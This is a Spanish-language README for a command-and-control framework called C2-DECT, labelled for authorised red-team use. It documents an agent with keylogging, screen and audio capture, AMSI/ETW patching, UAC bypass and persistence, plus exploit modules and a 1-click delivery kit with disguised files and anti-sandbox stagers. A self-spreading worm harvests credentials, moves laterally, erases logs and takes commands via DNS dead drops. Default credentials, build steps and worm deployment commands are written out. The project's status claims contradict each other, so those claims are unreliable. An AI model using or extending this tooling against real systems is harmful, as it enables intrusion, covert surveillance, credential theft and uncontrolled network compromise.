# C2-DECT - Framework de Command & Control

> **ADVERTENCIA**: Uso exclusivo para testing de seguridad autorizado y operaciones de Red Team.

## Estado del Proyecto

| Fase | Estado | Descripción |
|------|--------|-------------|
| **Fase 1** | ✅ Completa | Servidor Go básico con SQLite |
| **Fase 2** | ✅ Completa | Multi-sesión, REST API, JWT |
| **Fase 3** | ✅ Completa | DNS, WebSocket, SMB, BOF, GUI |
| **Fase 4** | ✅ Completa | P2P, Hollowing, Polimorfismo, Recon |
| **Fase 5** | ✅ Completa | PIC, Syscalls ASM, Plugins, IA offline |
| **Fase 6** | ✅ Completa | Exploits, Staging, IA táctica, Kill Switch |
| **Fase 7** | ✅ Completa | Movimiento lateral |
| **Fase 10** | ✅ Completa | Shellcode ASM + PIC (Position-Independent Code) |
| **Fase 11** | ✅ Completa | Evasion de Firmas (strings, signatures, memory) |
| **Fase 12** | ✅ Completa | Movimiento Lateral Completo (discovery, lateral, trust) |
| **Fase 13** | ✅ Completa | Exploit Lab Expandido (CVE DB, analysis, payloads, testing) |
| **Fase 14** | ✅ Completa | IA Integrada en Tiempo Real (Ollama, planning, tactical) |
| **Fase 15** | ✅ Completa | Investigación Autónoma (Reverse Engineering, fuzzing, diffing) |
| **Fase 16** | ✅ Completa | Motor de Orquestación y Ejecución en Memoria |
| **Fase 17** | 🧪 Simulador | Worm: simulador seguro `modules/worm-sim/` (campaña sobre topología sintética, risk scoring, rutas BFS, pytest). El crate Rust `modules/lateral-rust/` (motor de referencia) se **conserva intacto**: estado 🧱 COMPILES, build+test en CI, sin gate fmt/clippy (código legado) |
| **Fase 18** | 🔲 Planificada | Consolidación, testing automatizado y hardening (ver roadmap) |
| **Extra: Delivery Kit** | ✅ Implementada | Acceso inicial 1-click: poliglota APK/JPEG, merge/HTA/LNK, stager Go anti-sandbox (T1497), stego PNG, tokens single-use, telemetría funnel |
| **Extra: Reconocimiento** | ✅ Implementada | Auditoría completa del dispositivo (12 módulos) + búsqueda de vulnerabilidades (CVEs con CVSS, exploits y top-CVEs) |

### Taxonomía de estados

Cada módulo está etiquetado con su nivel real de madurez. "Compila" NO significa "implementado":

| Estado | Significado | Ejemplos actuales |
|--------|-------------|-------------------|
| 🔲 PLANIFICADO | Diseñado, sin código o con esqueleto | Fase 18, resto de Fase 17 |
| 🧱 COMPILES | Compila/construye pero ninguna funcionalidad validada | módulos C/C++ de las fases 10-16 |
| 🧪 UNIT-TESTED | Pruebas unitarias automatizadas pasan | servidor Go (`go test ./...`), worm-sim (pytest) |
| 🧫 INTEGRATION-TESTED | Pruebas entre componentes en CI (race, clippy, build matrix) | pipeline `.github/workflows/ci.yml` |
| 🏗️ LAB-VALIDATED | Probado en laboratorio controlado (lab local) | GUI↔servidor↔agente (smoke test manual), stager end-to-end |
| 📋 DOCUMENTED | Guías de despliegue/operación y threat model | COMMERCIAL_DEPLOYMENT_GUIDE.md, THREAT_MODEL.md |
| ✅ PRODUCTION-READY | Hardened + testado + auditado + documentado | **ninguno aún** — ver roadmap Fase 18 |

> **Regla de oro:** un módulo solo puede marcarse ✅ cuando pasa por TODOS los estados anteriores y el `THREAT_MODEL.md` lo cubre. Hoy el servidor Go es el único componente entre `🧪 UNIT-TESTED` y `🏗️ LAB-VALIDATED`.

---

## Arquitectura General

```
┌─────────────────────────────────────────────────────────────────┐
│                        GUI C# (WPF)                            │
│   Inline Styles │ MVVM │ Thread-Safe │ Chat IA │ Remote Desktop│
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    SERVIDOR GO (Core)                           │
│  REST API │ JWT Auth │ SQLite (modernc) │ Malleable Profiles    │
└─────────────────────────────────────────────────────────────────┘
        │           │           │           │           │
        ▼           ▼           ▼           ▼           ▼
┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
│ Listener │ │ Listener │ │ Listener │ │ Listener │ │ Listener │
│  HTTPS   │ │   DNS    │ │WebSocket │ │   SMB    │ │   TCP    │
└──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     AGENTE GO (Main)                            │
│  34 comandos │ Remote Desktop │ Keylogger │ AMSI/ETW Bypass     │
│  Persistence │ VM Detection │ Self-Delete │ File Manager        │
└─────────────────────────────────────────────────────────────────┘
```

> **Módulos extra citados más abajo:** el **Delivery Kit** (`delivery/`) es un subsistema
> independiente de acceso inicial (1-click) que conecta la GUI con un servidor HTTP de
> entrega (8899) para sembrar el payload al agente, y **deriva al agente final al C2 core
> (8443)** con su propia telemetría de funnel. El **Reconocimiento** (`reconocimiento-c2/`)
> audita el dispositivo objetivo (12 módulos) y busca vulnerabilidades (CVEs con CVSS,
> exploits y top-CVEs). Ambos se lanzan desde la GUI (TOOLS) como procesos externos.
> Ver secciones **[Módulo Extra: Delivery Kit](#módulo-extra-delivery-kit-acceso-inicial)**
> y **[Módulo Extra: Reconocimiento](#módulo-extra-reconocimiento-y-búsqueda-de-vulnerabilidades)**
> al final.

---

## Fase 1-3: Servidor y Agente Base

### Servidor Go

**Ubicación:** `server/`

| Archivo | Descripción |
|---------|-------------|
| `cmd/main.go` | Punto de entrada (port 8443, JWT, SQLite) |
| `api/handlers.go` | API REST (30+ endpoints) |
| `db/database.go` | SQLite con modernc (pure Go, sin CGO) |
| `auth/jwt.go` | Autenticación JWT |
| `profiles/malleable.go` | Perfiles maleables de tráfico |
| `core/listener.go` | Listener multi-protocolo |
| `core/session.go` | Gestión de sesiones |

**Compilar:**
```bash
cd server
go build -o ../build/server.exe ./cmd/main.go
```

**Ejecutar:**
```bash
build/server.exe --port 8443 --secret "tu-secreto"
```

**Credenciales por defecto:**
- Usuario: `admin`
- Contraseña: `c2-dect`

### Dependencias del Servidor

```
github.com/gin-gonic/gin          # HTTP framework
modernc.org/sqlite                # SQLite pure Go (sin CGO)
github.com/golang-jwt/jwt/v5      # JWT authentication
github.com/google/uuid            # UUID generation
golang.org/x/crypto               # bcrypt password hashing
```

---

## Agente Go (Principal)

**Ubicación:** `cmd/agent_go/`

### Archivos

| Archivo | Descripción | LOC |
|---------|-------------|-----|
| `main.go` | Core del agente, beacon, 34 comandos | ~500 |
| `capabilities.go` | Stealt, keylogger, clipboard, screenshot, remote desktop HTTP | ~470 |
| `filemanager.go` | Operaciones de archivos (CRUD) | ~120 |
| `input.go` | Mouse/keyboard control via Windows API | ~174 |
| `go.mod` | Dependencias del módulo | - |

### Comandos Soportados (34)

#### Shell y Sistema
| Comando | Descripción |
|---------|-------------|
| `shell <cmd>` | Ejecutar comando en shell |
| `ls` / `dir [path]` | Listar directorios |
| `cat` / `type <file>` | Leer archivos |
| `find` / `search <path> <name>` | Buscar archivos |
| `mkdir <path>` | Crear directorio |
| `cp` / `copy <src> <dst>` | Copiar archivos |
| `mv` / `move <src> <dst>` | Mover archivos |
| `rm` / `del <path>` | Eliminar archivos |
| `upload <remote_path>` | Subir archivo desde servidor |
| `download <path>` | Descargar archivo al servidor |
| `ps` / `processes` | Listar procesos |
| `kill <pid>` | Matar proceso |
| `sysinfo` | Información del sistema |
| `netinfo` | Información de red |
| `services` | Servicios del sistema |
| `env` | Variables de entorno |
| `connections` / `netstat` | Conexiones de red activas |

#### Captura y Monitoreo
| Comando | Descripción |
|---------|-------------|
| `screenshot` | Captura de pantalla (PNG) |
| `screeninfo` | Resolución y bounds de pantalla |
| `screenstream` | Streaming continuo de pantalla |
| `keylogger` | Keylogger persistente (logs a archivo) |
| `clipboard` / `getclip` | Obtener contenido del clipboard |
| `setclip <text>` | Establecer contenido del clipboard |
| `activewindow` | Ventana activa actual |
| `webcam` | Listar cámaras disponibles |
| `audio <seconds>` | Capturar audio |

#### Remote Desktop
| Comando | Descripción |
|---------|-------------|
| `desktop <port>` | Iniciar servidor HTTP de remote desktop |
| `mouse <action> <x> <y>` | Control de mouse (move/left_click/right_click/scroll) |
| `keyboard <text>` | Enviar teclas |

#### Persistencia y Stealth
| Comando | Descripción |
|---------|-------------|
| `sleep <seconds>` | Cambiar intervalo de beacon |
| `exit` | Terminar agente |

#### Worm Engine
| Comando | Descripción | Formato |
|---------|-------------|---------|
| `worm` | Desplegar worm binario | `worm <base64>\|<mode>` |
| `worm_stop` | Detener worm y limpiar | `worm_stop` |
| `worm_status` | Verificar estado del worm | `worm_status` |
| `worm_config` | Generar config Rust | `worm_config <domain> <subnet>` |

### Funciones Stealth (capabilities.go)

| Función | Descripción |
|---------|-------------|
| `bypassAMSI()` | Patch AMSI en memoria via PowerShell |
| `patchETW()` | Patch ETW para evadir telemetría |
| `detectVM()` | Detección de VM/sandbox (VMware, VirtualBox, QEMU) |
| `uacBypass()` | Bypass UAC via Fodhelper |
| `persistenceRegistry()` | Persistencia via HKCU Run key |
| `persistenceScheduledTask()` | Persistencia via tarea programada |
| `installService()` | Instalar como servicio Windows |
| `selfDelete()` | Auto-eliminación del binario |

### Remote Desktop (Go HTTP Server)

**Implementación:** Go `net/http` puro, sin dependencias externas.

**Puerto por defecto:** 9090 (8080 puede estar ocupado por HTTP.sys de Windows)

**Endpoints:**
- `GET /` — Viewer HTML con auto-refresh cada 500ms
- `GET /screen` — Screenshot JPEG actual
- `GET /mouse?action=<type>&x=<x>&y=<y>` — Control de mouse
- `POST /keyboard` — Enviar teclas (JSON: `{"text":"..."}`)

**Flujo:**
1. Operador ejecuta `desktop 9090`
2. Agente inicia HTTP server en Go
3. Operador abre `http://localhost:9090` en navegador
4. Se muestra screenshot en vivo con refresh automático
5. Clicks y teclas se envían al agente

### File Manager (filemanager.go)

| Función | Descripción |
|---------|-------------|
| `listFiles(path)` | Listar archivos con tamaño y fecha |
| `readFile(path)` | Leer contenido de archivo |
| `writeFile(path, data)` | Escribir archivo |
| `copyFile(src, dst)` | Copiar archivo |
| `deleteFile(path)` | Eliminar archivo |
| `moveFile(src, dst)` | Mover archivo |
| `searchFiles(path, name)` | Buscar por nombre |

### Input Control (input.go)

**Método:** Llamadas directas a `user32.dll` via `syscall`.

| Función | API Windows |
|---------|-------------|
| `mouseMove(x, y)` | `SetCursorPos` |
| `mouseClick(down, up)` | `mouse_event` |
| `mouseScroll(delta)` | `mouse_event` |
| `keyPress(vk)` | `keybd_event` |
| `typeText(text)` | `keybd_event` por carácter |

---

## GUI C# (WPF)

**Ubicación:** `gui/C2Dect/`

### Archivos Fuente

| Archivo | Descripción |
|---------|-------------|
| `App.xaml` / `App.xaml.cs` | Entry point, servicios, exception handling |
| `Logger.cs` | Logging a `gui_crash.log` |
| `Views/LoginWindow.xaml` | Ventana de login |
| `Views/MainWindow.xaml` | Ventana principal (consola, sessions, comandos) |
| `Views/RemoteDesktopWindow.xaml` | Visor de remote desktop |
| `ViewModels/MainViewModel.cs` | MVVM, thread-safe logging, command handling |
| `Services/ApiService.cs` | Cliente HTTP para API del servidor |
| `Services/AuthService.cs` | Autenticación JWT |
| `Services/SignalRService.cs` | WebSocket/SignalR para tiempo real |
| `Converters/StringToBrushConverter.cs` | Conversión de colores para consola |

### Stack
- **Framework:** .NET 8 WPF
- **Estilos:** Inline (sin MaterialDesign, evita errores de XAML)
- **Thread Safety:** `SafeAdd()` con `Dispatcher.Invoke()` para `ObservableCollection`
- **Logging:** Archivo `gui_crash.log` con timestamps

### Funcionalidades
- Login con JWT
- Consola de comandos con colores (sent/received/error/info)
- Quick commands (system info, remote desktop, processes)
- Remote desktop viewer (HTTP polling cada 200ms)
- Auto-scroll en consola
- Lanzar agentes.exe con parámetros

---

## Fase 4: ULTRA - Capacidades Avanzadas

### P2P Mesh Network
**Ubicación:** `ultra/p2p/`
- Red malla con X25519
- Enrutamiento por relay
- Comunicación sin conexión directa al C2

### Process Hollowing
**Ubicación:** `ultra/hollowing/`
- Hollow (clásico)
- Doppelganger
- Module Stomping
- DLL Proxy

### Motor Polimórfico
**Ubicación:** `ultra/polymorphic/`
- Reordenamiento de funciones
- Barajado de bloques
- Código muerto
- Encriptación de strings
- Gramática de tráfico

### Evasión Adaptativa
**Ubicación:** `ultra/evasion/`
- Detección de entorno
- Modo Ghost
- Monitoreo de hooks
- Patching ETW/AMSI

---

## Fase 5: C2 Avanzado con PIC

### Core C (Position-Independent Code)
**Ubicación:** `pic-asm/core/`

```
pic-asm/core/
├── include/
│   ├── c2_core.h           # Tipos principales
│   ├── platform_windows.h  # Windows PEB/syscalls
│   └── platform_linux.h    # Linux syscalls directos
├── src/
│   └── c2_core.c           # Implementación core
└── asm/
    └── syscall_x64.asm     # Stubs de syscalls ASM
```

### Generador de Shellcode
**Ubicación:** `pic-asm/tools/shellcode_gen.py`
```bash
python3 pic-asm/tools/shellcode_gen.py \
    -f build/agent_win_x64.exe \
    -o shellcode.bin \
    --arch x64 \
    --encrypt xor
```

### Canales Alternativos
**Ubicación:** `pic-asm/channels/`
- Microsoft Teams, Slack, Discord, Twitter

### Air-Gap Operations
**Ubicación:** `pic-asm/airgap/`
- Detección USB, exfiltración offline, cola de tareas

---

## Fase 6: Exploits e IA Autónoma

### Motor de Explotación
**Ubicación:** `exploits/exploit-engine/`

| Exploit | CVE | Tipo |
|---------|-----|------|
| EternalBlue | CVE-2017-0144 | RCE |
| BlueKeep | CVE-2019-0708 | RCE |
| Log4Shell | CVE-2021-44228 | RCE |
| Follina | CVE-2022-30190 | RCE |
| PrintNightmare | CVE-2021-34527 | RCE |
| PetitPotam | CVE-2021-36942 | NTLM Relay |

### Asistente IA (Ollama + Llama 3.1 8B)
**Ubicación:** `exploits/ai/`
- Planificación táctica
- Selección de módulos
- Análisis de escaneos
- Generación de comandos

### Kill Switch
**Niveles:**
| Nivel | Acción |
|-------|--------|
| 1 | Pausar operaciones |
| 2 | Dormir y esperar |
| 3 | Autodestrucción |
| 4 | Detener inmediatamente |

---

## API Endpoints

### Autenticación
```
POST /api/auth/login          # Obtener token JWT
```

### Sesiones
```
GET    /api/sessions            # Listar sesiones
GET    /api/sessions/:id        # Detalles de sesión
POST   /api/sessions/:id/task   # Crear tarea
GET    /api/sessions/:id/tasks  # Listar tareas
DELETE /api/sessions/:id        # Eliminar sesión
```

### Agentes
```
GET    /api/agents              # Listar agentes
POST   /api/agents/build        # Compilar agente
GET    /api/agents/download/:id # Descargar binario
```

### Exploits
```
GET    /api/exploits            # Listar exploits
POST   /api/exploits/check      # Verificar vulnerabilidad
POST   /api/exploits/execute    # Ejecutar exploit
```

### IA
```
POST   /api/ai/query            # Consultar IA
POST   /api/ai/plan             # Planificar campaña
```

### Seguridad
```
POST   /api/security/kill       # Activar kill switch
POST   /api/security/rules      # Gestionar reglas
```

---

## Compilación

### Prerrequisitos
- Go 1.21+
- .NET 8 SDK (GUI)
- MSVC 2022 (agente C++ fase 5, opcional)
- CMake 3.20+ (fase 5, opcional)
- Python 3.10+ (exploit engine)
- Docker (Ollama para IA)

### Build Scripts
```bash
# Compilar todo
build_all.bat

# Solo servidor
cd server && go build -o ../build/server.exe ./cmd/main.go

# Solo agente
cd cmd/agent_go && go build -o ../../build/agent.exe .

# GUI
cd gui && dotnet build C2Dect\C2Dect.csproj
```

---

## Estructura de Directorios

```
c2-dect/
├── server/                    # Servidor Go (core)
│   ├── cmd/main.go           # Entry point
│   ├── api/handlers.go       # REST handlers (30+)
│   ├── db/database.go        # SQLite (modernc)
│   ├── auth/jwt.go           # JWT authentication
│   ├── core/                 # Listener, sessions
│   ├── profiles/             # Malleable C2
│   └── v3/                   # DNS, WebSocket, SMB, SOCKS, BOF
├── cmd/agent_go/             # Agente Go (principal)
│   ├── main.go               # Beacon + 34 comandos
│   ├── capabilities.go       # Stealth, keylogger, remote desktop
│   ├── filemanager.go        # CRUD archivos
│   ├── input.go              # Mouse/keyboard API
│   ├── worm_deploy.go        # Worm deployment (worm, worm_stop, worm_status)
│   ├── go.mod                # Dependencias
│   └── go.sum
├── gui/C2Dect/               # GUI C# WPF
│   ├── Views/                # LoginWindow, MainWindow, RemoteDesktopWindow
│   ├── ViewModels/           # MainViewModel (MVVM)
│   ├── Services/             # API, Auth, SignalR
│   ├── Converters/           # StringToBrush
│   ├── Logger.cs             # Logging a archivo
│   └── App.xaml              # Entry point
├── modules/lateral-rust/     # 🆕 Worm Engine (Rust)
│   ├── Cargo.toml            # Configuración Rust
│   ├── src/
│   │   ├── main.rs           # Entry point
│   │   ├── lib.rs            # Library exports
│   │   ├── config.rs         # WormConfig
│   │   ├── entry/            # UAC Bypass, BlueKeep, ZeroLogon, ProxyLogon
│   │   ├── lateral/          # WMI, PTH, PsExec, SMB Relay
│   │   ├── credential/       # LSASS, SAM, DPAPI
│   │   ├── pivot/            # Double Pivot, SOCKS5
│   │   ├── propagation/      # Worm Engine Core
│   │   ├── dead_drop/        # DNS TXT, GitHub
│   │   ├── command/          # Command Parser, Executor
│   │   ├── beacon/           # HTTPS Beacon
│   │   ├── inject/           # Hollowing, Service, Reflective
│   │   ├── evasion/          # ETW, AMSI, Unhook, Sleep
│   │   ├── crypto/           # AES, NTLM, Keys
│   │   └── protocol/         # SMB, HTTP, DNS
│   └── tests/
├── build/                    # Binarios compilados
│   ├── server.exe
│   └── agent.exe
├── ultra/                    # Fase 4 (P2P, Hollowing, Polymorphic)
├── pic-asm/                   # Fase 5 (PIC, ASM, Plugins)
├── exploits/                   # Fase 6 (Exploits, IA, Kill Switch)
├── lateral/                   # Fase 7 (Lateral Movement)
├── lateral/discovery-ext/                  # Fase 12 (Discovery, Extended Lateral)
├── exploit-lab/                  # Fase 13 (Exploit Lab)
├── ia-realtime/                  # Fase 14 (IA Integrada)
├── autonomous-research/                  # Fase 15 (Investigación Autónoma)
├── orchestration/                  # Fase 16 (Orquestación)
├── android/                  # Fase 9 (Android agent, planificado)
├── agent/                    # Agente C++ legacy
├── client/                   # Cliente Python
├── pkg/                      # Paquetes compartidos
├── go.mod                    # Module: c2-dect
├── build_all.bat             # Build completo
├── README.md                 # Este archivo
├── ROADMAP.md                # Roadmap de fases
├── gui_crash.log             # Log de crashes GUI
└── gui_error.log             # Log de errores GUI
```

---

## Stack Tecnológico

| Componente | Tecnología | Versión |
|------------|------------|---------|
| Servidor | Go | 1.21+ |
| Agente | Go | 1.21+ |
| GUI | C# WPF | .NET 8 |
| Worm Engine | Rust | 2021 edition |
| Base de datos | SQLite | modernc (pure Go) |
| Motor exploits | Python | 3.10+ |
| IA | Ollama + Llama 3.1 8B | - |
| Build | go build, dotnet build, cargo build | - |
| Remote Desktop | Go net/http | - |
| Encryption | AES-256-GCM + X25519 + Ed25519 | - |
| Async | Tokio | 1.x |
| Windows API | windows-rs | 0.56 |

---

## Seguridad

### Reglas de Engagement
1. **Subredes autorizadas**: Solo interactuar con IPs permitidas
2. **Comandos bloqueados**: No ejecutar comandos destructivos
3. **Hosts protegidos**: No tocar sistemas críticos
4. **Límites de tiempo**: Ventanas de operación
5. **Límite de acciones**: Número máximo de operaciones

### Kill Switch
```bash
# Pausar todo
curl -X POST http://localhost:8443/api/security/kill -d '{"level": 1}'

# Autodestrucción
curl -X POST http://localhost:8443/api/security/kill -d '{"level": 3}'
```

### Auditoría
Todas las acciones quedan registradas:
- Decisiones de IA
- Exploits ejecutados
- Comandos ejecutados
- Acciones bloqueadas
- Logs en `gui_crash.log` y SQLite

---

## Cómo Ejecutar

### 1. Iniciar Servidor
```bash
cd build
./server.exe
# Server listening on 0.0.0.0:8443
```

### 2. Iniciar Agente
```bash
cd build
./agent.exe -s 127.0.0.1 -p 8443
```

### 3. Abrir GUI
```bash
cd gui/C2Dect/bin/Debug/net8.0-windows
./C2Dect.exe
# Login: admin / c2-dect
```

### 4. Enviar Comandos
Desde la GUI o API:
```bash
# Login
curl -X POST http://localhost:8443/api/auth/login \
  -d '{"username":"admin","password":"c2-dect"}'

# Enviar comando
curl -X POST http://localhost:8443/api/sessions/<ID>/task \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"command":"sysinfo","args":""}'
```

### 5. Remote Desktop
```bash
# Desde GUI: click "Remote Desktop" o escribir "desktop 9090"
# Abrir en navegador: http://localhost:9090
```

---

## License

Uso interno únicamente. Distribución no autorizada prohibida.

---

## Fase 17: Worm Engine Autónomo (Rust)

### Estado: ✅ Completo (12/12 sub-fases)

| Sub-Fase | Técnica | Estado | Archivos |
|----------|---------|--------|----------|
| 1 | UAC Bypass (Fodhelper, EventViewer, CMSTP, ComputerDefaults, Slui) | ✅ | `entry/uac.rs` |
| 2 | WMI Lateral Movement (Win32_Process.Create via COM) | ✅ | `lateral/wmi.rs` |
| 3 | Pass-the-Hash nativo (NTLMv2 sin mimikatz) | ✅ | `lateral/pth.rs`, `crypto/ntlm.rs` |
| 4 | Credential Harvesting (LSASS, SAM, DPAPI) | ✅ | `credential/lsass.rs`, `sam.rs`, `dpapi.rs` |
| 5 | SMB Relay (NTLM capture + relay) | ✅ | `lateral/smb_relay.rs` |
| 6 | Exploits (BlueKeep, ZeroLogon, ProxyLogon) | ✅ | `entry/bluekeep.rs`, `zerologon.rs`, `proxylogon.rs` |
| 7 | Double Pivot (TCP relay + SOCKS5) | ✅ | `pivot/double.rs`, `socks5.rs` |
| 8 | Worm Engine Core (BFS + scanner + deployer) | ✅ | `propagation/worm.rs`, `scanner.rs`, `deployer.rs` |
| 9 | Dead Drop (DNS TXT + GitHub README) | ✅ | `dead_drop/dns.rs`, `github.rs` |
| 10 | Command Executor (parser + shell + self-destruct) | ✅ | `command/parser.rs`, `executor.rs` |
| 11 | Beacon Selectivo (HTTPS al C2) | ✅ | `beacon/https.rs`, `evaluator.rs` |
| 12 | Orquestador (ciclo scan→harvest→evaluate→propagate) | ✅ | `propagation/worm.rs` |

### Arquitectura

```
┌─────────────────────────────────────────────────────────────┐
│                    C2 SERVER (Go)                           │
│  - REST API, JWT, SQLite                                    │
│  - GUI C# (WPF)                                            │
│  - Recibe beacon solo cuando score alto                     │
└─────────────────────────────────────────────────────────────┘
        ▲
        │ Beacon HTTPS (solo si score > umbral)
        │
┌───────┴─────────────────────────────────────────────────────┐
│                  DEAD DROP RESOLVERS                         │
│  - DNS TXT (principal) → {worm_id}.{domain}/upd/txt        │
│  - GitHub README (backup)                                   │
│  - Kill switch: instrucción KILL/PAUSE/RESUME               │
└───────────────────────┬─────────────────────────────────────┘
                        │ Lectura pasiva (sin abrir puertos)
                        ▼
┌─────────────────────────────────────────────────────────────┐
│              WORM ENGINE (Rust) - Autónomo                   │
│                                                              │
│  Host A ──▶ Host B ──▶ Host C ──▶ DC (score=18 → BEACON)   │
│    │                                                         │
│    ▼                                                         │
│  Host D ──▶ Host E ──▶ SQL (score=15 → BEACON)              │
│                                                              │
│  Propagación BFS, max_depth configurable                    │
│  Auto-eliminación después de tiempo configurable            │
└─────────────────────────────────────────────────────────────┘
```

### Técnicas de Movimiento Lateral

| Método | Prioridad | Descripción | API Windows | Estado |
|--------|-----------|-------------|-------------|--------|
| **WMI** | 1 | Win32_Process.Create via IWbemLocator/IWbemServices | COM DCOM | ✅ Compila |
| **PsExec** | 2 | SCM CreateService + StartService | Win32 API | ✅ Compila |
| **DCOM** | 3 | MMC20.Application / ShellWindows | COM | ✅ Compila |
| **Pass-the-Hash** | 4 | NTLMv2 computation nativa (NT hash, HMAC-MD5) | Crypto nativo | ✅ Compila |

### Técnicas de UAC Bypass

| Método | Fichero | Descripción | Estado |
|--------|---------|-------------|--------|
| **Fodhelper** | `entry/uac.rs` | ms-settings\Shell\Open\command | ✅ |
| **EventViewer** | `entry/uac.rs` | mmc.exe\Shell\Open\command | ✅ |
| **CMSTP** | `entry/uac.rs` | Inf defaultinstall sections | ✅ |
| **ComputerDefaults** | `entry/uac.rs` | ms-settings\Shell\Open\command | ✅ |
| **Slui** | `entry/uac.rs` | HKCU\Software\Classes | ✅ |

### Técnicas de Credential Harvesting

| Método | Archivo | Descripción | Estado |
|--------|---------|-------------|--------|
| **LSASS Dump** | `credential/lsass.rs` | MiniDumpWriteDump (0x00000002) | ✅ Compila |
| **SAM Extraction** | `credential/sam.rs` | Reg save HKLM\SAM + SYSTEM | ✅ Compila |
| **DPAPI** | `credential/dpapi.rs` | CryptUnprotectData master key | ✅ Compila |

### Exploits Implementados

| CVE | Archivo | Target | Método | Estado |
|-----|---------|--------|--------|--------|
| CVE-2019-0708 | `entry/bluekeep.rs` | RDP BlueKeep checker | Check only | ✅ Compila |
| CVE-2020-1472 | `entry/zerologon.rs` | Netlogon Zerologon | Check only | ✅ Compila |
| CVE-2021-26855 | `entry/proxylogon.rs` | Exchange ProxyLogon | Exploit | ✅ Compila |

### Dead Drop Resolvers

| Método | Tipo | Formato DNS | Detección | Estado |
|--------|------|-------------|-----------|--------|
| **DNS TXT** | Principal | `{worm_id}.{domain}/upd/txt` | Muy baja | ✅ Compila |
| **GitHub README** | Backup | `https://github.com/{user}/{repo}/raw/main/README` | Baja | ✅ Compila |

**Instrucciones soportadas vía Dead Drop:**
- `KILL` → Auto-eliminación inmediata
- `PAUSE` → Pausar propagación
- `RESUME` → Reanudar operación
- `BEACON` → Forzar beacon al C2
- `SHELL <cmd>` → Ejecutar comando
- `STATUS` → Reportar estado

### Evasión de Detección

| Técnica | Archivo | Descripción | Estado |
|---------|---------|-------------|--------|
| **ETW Patch** | `evasion/etw.rs` | Patch EtwEventWrite en memoria | ✅ Compila |
| **AMSI Patch** | `evasion/amsi.rs` | Patch AmsiScanBuffer | ✅ Compila |
| **ntdll Unhook** | `evasion/unhook.rs` | Carga fresca de ntdll desde disco | ✅ Compila |
| **Sleep Obfuscation** | `evasion/sleep.rs` | XOR sleep + VirtualAlloc/VirtualProtect | ✅ Compila |

### Pivoting

| Técnica | Archivo | Descripción | Estado |
|---------|---------|-------------|--------|
| **Double Pivot** | `pivot/double.rs` | TCP relay async con next-hop chaining | ✅ Compila |
| **SOCKS5** | `pivot/socks5.rs` | Server SOCKS5 (CONNECT method) | ✅ Compila |

### Propagación - Ciclo del Worm

```
1. SCAN ──────── Async port scanner (135,139,445,3389,5985,1433)
2. HARVEST ───── Dump credenciales (LSASS, SAM, DPAPI)
3. EVALUATE ──── Score: DC=18, SQL=15, Exchange=14, RDP=12, WinRM=10
4. PROPAGATE ─── Deploy: WMI → PsExec → DCOM (fallback chain)
5. DEAD DROP ─── Check DNS TXT por instrucciones
6. BEACON ────── Solo si score > umbral (default: 15)
7. CLEANUP ───── Borrar logs, sobrescribir temp
8. REPEAT ◄───── BFS hasta max_depth
```

**Configuración de propagación:**
- `max_depth: 5` → Profundidad máxima de saltos
- `max_hosts_per_scan: 50` → Targets por escaneo
- `scan_delay_ms: 100` → Delay entre escaneos
- `beacon_threshold: 15` → Score mínimo para beacon
- `max_depth: u32::MAX` → Sin límite de profundidad (opcional)

### Inyección de Procesos

| Técnica | Archivo | Descripción | Estado |
|---------|---------|-------------|--------|
| **Process Hollowing** | `inject/hollowing.rs` | CreateProcess + NtUnmapViewOfSection + WriteProcessMemory | ✅ Compila |
| **Service Deploy** | `inject/service.rs` | CreateServiceA + StartServiceA | ✅ Compila |
| **Reflective DLL** | `inject/reflective.rs` | Manual mapping de DLL en memoria | ✅ Compila |

### Criptografía

| Módulo | Archivo | Descripción | Estado |
|--------|---------|-------------|--------|
| **AES-256-GCM** | `crypto/aes.rs` | Encriptación de tráfico y config | ✅ Compila |
| **NTLMv2** | `crypto/ntlm.rs` | NT hash, LM hash, HMAC-MD5, ntlmv2_response | ✅ Compila |
| **Key Derivation** | `crypto/keys.rs` | Derivación de claves | ✅ Compila |

### Integración con Agente Go

El agente Go puede desplegar el worm con los siguientes comandos:

| Comando | Descripción | Formato |
|---------|-------------|---------|
| `worm` | Desplegar worm binario | `worm <base64_binary>\|<mode>` |
| `worm_stop` | Detener worm y eliminar servicios | `worm_stop` |
| `worm_status` | Verificar estado del worm | `worm_status` |
| `worm_config` | Generar snippet de configuración Rust | `worm_config <domain> <subnet>` |

**Modos de instalación:**
- `temp` → Ejecuta desde %TEMP% (default)
- `service` → Instala como servicio Windows (System32)
- `scheduled` → Crea tarea programada onlogon
- `persistent` → Registry Run key + ejecuta

**Ejemplo de uso:**
```bash
# Desde panel C2: subir worm.exe y desplegar
upload worm.exe
worm <base64_worm>|service

# Verificar estado
worm_status

# Detener worm
worm_stop
```

### Compilación (WSL2)

> **NOTA**: Windows WDAC/AppLocker bloquea la compilación nativa. Usar WSL2.

```bash
# Instalar Rust en WSL2
wsl -e bash -c "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y"
wsl -e bash -c "source /home/admin1/.cargo/env && rustup target add x86_64-pc-windows-gnu"

# Sincronizar código a WSL2
wsl -e cp -r /mnt/c/Users/USER1/Desktop/test/cs+/c2-dect/modules/lateral-rust/src /home/admin1/lateral-rust/

# Compilar
wsl -e bash -c "source /home/admin1/.cargo/env && cd /home/admin1/lateral-rust && cargo build --release --target x86_64-pc-windows-gnu"

# Copiar binario a Windows
cp /home/admin1/lateral-rust/target/x86_64-pc-windows-gnu/release/worm.exe /mnt/c/Users/USER1/Desktop/test/cs+/c2-dect/modules/lateral-rust/
```

**Resultado:** `worm.exe` ~494KB (release, stripped, LTO, opt-level=z)

### Stack Tecnológico

| Componente | Tecnología | Versión |
|------------|------------|---------|
| Worm Engine | Rust | 2021 edition |
| Async Runtime | Tokio | 1.x |
| Crypto | AES-GCM | 0.10 |
| HTTP Client | Reqwest (rustls-tls) | 0.12 |
| Windows API | windows-rs | 0.56 |
| DNS | trust-dns-client | 0.23 |
| Build Target | x86_64-pc-windows-gnu | - |

### Seguridad del Worm

| Mecanismo | Descripción |
|-----------|-------------|
| **Dead Drop** | No abre puertos, solo lee DNS TXT pasivamente |
| **Beacon selectivo** | Solo contacta C2 si score > umbral (default: 15) |
